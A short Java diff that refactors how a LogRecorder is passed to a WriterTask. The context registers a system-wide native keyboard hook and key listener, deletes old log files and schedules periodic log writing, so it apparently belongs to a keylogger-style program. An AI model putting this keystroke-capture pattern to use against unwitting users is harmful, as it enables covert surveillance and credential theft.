@@ -44,8 +44,7 @@ public class LogicFlow {
         //TODO
         logFilesCollector.removeLogs(files);
         GlobalScreen.registerNativeHook();
-        logRecorder = new LogRecorder();
-        writerTask = new WriterTask(keyReader,logRecorder);
+        writerTask = new WriterTask(keyReader, new LogRecorder());
         GlobalScreen.addNativeKeyListener(keyReader);
         timer.schedule(writerTask,1000L,10000L);
     }
